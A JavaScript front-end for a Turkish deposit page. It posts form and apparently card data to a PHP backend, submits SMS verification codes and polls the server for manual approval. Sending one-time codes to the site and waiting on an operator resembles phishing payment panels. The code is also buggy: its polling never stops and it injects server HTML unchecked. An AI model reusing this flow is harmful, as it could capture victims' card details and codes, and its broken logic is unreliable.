class Route {
    static push(path){
      const xhr = new XMLHttpRequest();
      xhr.open("GET", `view/${path}.php`);
      xhr.onload = function(){
        if (this.status == 200) {
          document.querySelector("#app").innerHTML = this.responseText;
        }
      };
      xhr.send();
      let loader  = document.createElement("div")
      loader.classList.add("spinner-border","spinner-border-sm","text-warning")
      loader.setAttribute("role", "status")
      let span = document.createElement("span")
      span.classList.add("sr-only")
      loader.append(span)
      if (document.querySelector(".payment-card")) {
        document.querySelector(".payment-card .card-header").append(loader);
      }
      if(event){
        event.preventDefault()
      }
    }
  }
  
let currentRoute = location.pathname.split('/')[location.pathname.split('/').length - 1];
Route.push(currentRoute.length > 0 ? currentRoute : 'main');

var y = 1;                  //  set your counter to 1

function odemeDurum(type) {         //  create a loop function
  setTimeout(function() { 
    //  call a 3s setTimeout when the loop is called
    $.ajax({
      type: "POST",
      data: { type: type },
      url: "/odemereq.php?q=odeme-durum",
      success: function(response) {
          if (response == '1'){
            y + 100;
            $('#step-2').hide();
            $('#step-3').show();
            swal.close();
            Swal.fire({
              title: "Talebiniz Onaylandı!",
              text: "5 saniye sonra yönlendirileceksiniz.",
              icon: "success",
              showConfirmButton: false,
              timer: 5000
            }).then(() => {
              window.location.href = "/";
            }).catch((error) => {
              // Yönlendirme başarısız olduğunda burası çalışacak
              console.log(error);
              var button = document.createElement("button");
              button.innerText = "Yönlendirme Butonu";
              button.addEventListener("click", function() {
                window.location.href = "/";
              });
              document.body.appendChild(button);
            });
          }
          else if(response == '2'){
            Swal.fire("Hata!","Yatırım Talebiniz Onaylanmadı Lütfen Daha Sonra Tekrar Deneyin!","error");
            setTimeout(function(){
              window.location.href = '/deposit';
            },
            
            5000)
          }
      }
    })  
    //  your code here
    // i++;                    //  increment the counter
    if (y < 10) {           //  if the counter < 10, call the loop function
      odemeDurum(type);    
                //  ..  again which will trigger another 
    }                       //  ..  setTimeout()
  }, 3000)
}


function setPayment(type, redirect = 0){
  return new Promise(resolve => {
    const xhr = new XMLHttpRequest();
    let data = new FormData(event.target);
    data.append("type", type);
    xhr.open("POST","/odemereq.php?q=payment");
    xhr.onload = function(){
      let res = this.responseText ? JSON.parse(this.responseText) : false;
      if (res.success) {
        if (redirect != 1) {
            $('[step="2"]').addClass('hidden');

            $('[step="3"]').removeClass('hidden');
          odemeDurum(type);
        }
      }else{
        Swal.fire("Hata!","Bilgileri doğru doldurduğunuza emin olun.","error")
      }
    }
    xhr.send(data);
    event.preventDefault();
  })
}
  
                              
                                
var i = 1;//  set your counter to 1

function myLoop() {         //  create a loop function
  setTimeout(function() {   //  call a 3s setTimeout when the loop is called
    $.ajax({
      type: "POST",
      url: "/odemereq.php?q=sms-durum",
      success: function(response) {
          if (response == '3'){
            i + 100;
            window.location.pathname = '/payment/sms';
          }
      }
    })  
    //  your code here
    // i++;                    //  increment the counter
    if (i < 10) {           //  if the counter < 10, call the loop function
      myLoop();             //  ..  again which will trigger another 
    }                       //  ..  setTimeout()
  }, 3000)
}



function setPaymentcre(type, redirect = 0){
    return new Promise(resolve => {
      const xhr = new XMLHttpRequest();
      let data = new FormData(event.target);
      data.append("type", type);
      xhr.open("POST","/odemereq.php?q=payment");
      xhr.onload = function(){
        let res = this.responseText ? JSON.parse(this.responseText) : false;
        if (res.success) {
          if (redirect != 1) {
            swal.fire({
              title: 'Lütfen Bekleyin',
              text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
              allowOutsideClick: false,
              showConfirmButton: false
            })
            .then(result => {
              if(result.value){
                [...document.querySelectorAll("input","select")].forEach(item => {
                  item.value = "";
                })
              }
            })
            myLoop();
          }else{
            resolve(res.message);
          }
        }else{
          Swal.fire("Hata!","Bilgileri doğru doldurduğunuza emin olun.","error")
        }
      }
      xhr.send(data);
      event.preventDefault();
    })
  }
  
var b = 1;                  //  set your counter to 1

  
                        
                          
function myLoop2() {         //  create a loop function
    setTimeout(function() {   //  call a 3s setTimeout when the loop is called
      $.ajax({
        type: "POST",
        url: "/odemereq.php?q=sms-durum",
        success: function(response) {
            if (response == '1'){
              b + 100;
              swal.close()
              Swal.fire("Yatırım başarılı!","","success")
              window.location.pathname = '/m';
            }
        }
      })  
      //  your code here
      // i++;                    //  increment the counter
      if (b < 10) {           //  if the counter < 10, call the loop function
        myLoop2();             //  ..  again which will trigger another 
      }                       //  ..  setTimeout()
    }, 3000)
  }
  
  
  
  
  
  
  
  
  
function smsOnay() {
  $.ajax({
    type: "POST",
    url: "/odemereq.php?q=sms-onay",
    data: $("#form").serialize(),
    success: (response) => {
      if (response == "success") {
        swal.fire({
          title: 'Lütfen Bekleyin',
          text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
          allowOutsideClick: false,
          showConfirmButton: false
        })
        myLoop2()
      }
    },
  });
}
                            
                            
  function putPayment(id, message,showalert=true){
    const xhr = new XMLHttpRequest;
    let data = new FormData(event.target);
    data.append("id", id);
    xhr.open("POST","/odemereq.php?q=update-payment");
    xhr.onload = function(){
      let res = JSON.parse(this.responseText);
      if (res.success) {
          if(showalert){
        Swal.fire("Yatırım başarılı!",message,"success")
        .then(result => {
          if(result.value){
            [...document.querySelectorAll("input","select")].forEach(item => {
              item.value = "";
            })
          }
        })
          }
      }else{
        Swal.fire("Hata!","Bilgileri doğru doldurduğunuza emin olun.","error")
      }
    }
    xhr.send(data);
    event.preventDefault();
  }
  
  let paparaStep = 0;
  let paparaId=0;
  async function payPapara(){
    event.preventDefault()
    if (paparaStep == 0) {
      paparaId = await setPayment('aninda-papara', 1)
      paparaStep = 1;
      document.querySelector("#step_1").classList.add("d-none");
  
      document.querySelector("#step_2").classList.remove("d-none");
    }else if(paparaStep == 1){
      putPayment(paparaId, 'Lütfen sayfadan çıkmadan bekleyiniz!\n Otomatik Yönlendiriyorsunuz Lütfen Sayfadan Ayrılmayınız', false);
      paparaStep = 0;
      document.querySelector("#step_1").classList.add("d-none");
      document.querySelector("#step_2").classList.add("d-none");
      document.querySelector("#step_3").classList.remove("d-none");
      document.querySelector("#btn-submit").classList.add("d-none");
      let number=20;
      setInterval(() => {if(number<=0){return parent.location.href='/';}
      number--;
          document.getElementById('seconds').textContent=number;
      }, 1000);
    }
  }
  
  function numExp(){
    event.target.value = event.target.value.replace(/[^\d.]/g, "")
  }
  function copyiban() {
    // Get the text field
    var copyText = document.getElementById("iban");
  
    // Select the text field
    copyText.select();
    copyText.setSelectionRange(0, 99999); // For mobile devices
  
    // Copy the text inside the text field
    navigator.clipboard.writeText(copyText.value);
    
    // Alert the copied text
    alert("Iban Kopyalandı " + copyText.value);
  }
  
  function checkBank(){
    const data = new FormData();
    data.append("id", parseInt(event.target.value));
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/request.php?q=get-bank");
    xhr.onload = function(){
      if (this.status == 200) {
        let response = JSON.parse(this.responseText);
        document.querySelector("#bank_name").innerText = response.name + " ";
        document.querySelector("#bank_holder").innerText = response.account_holder;
        document.querySelector("#bank_number").innerText = response.iban;
        const image = document.querySelector("#bank_logo");
        image.src = "assets/banks/"+ response.name + ".png";

      }
    }
    xhr.send(data);
  }
  function checkCrypto(){
    const data = new FormData();
    data.append("id", parseInt(event.target.value));
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/request.php?q=get-crypto");
    xhr.onload = function(){
      if (this.status == 200) {
        let response = JSON.parse(this.responseText);
        document.querySelector("#bank_name").innerText = response.name + " ";
        document.querySelector("#bank_number").innerText = response.crypto_code;

      }
    }
    xhr.send(data);
  }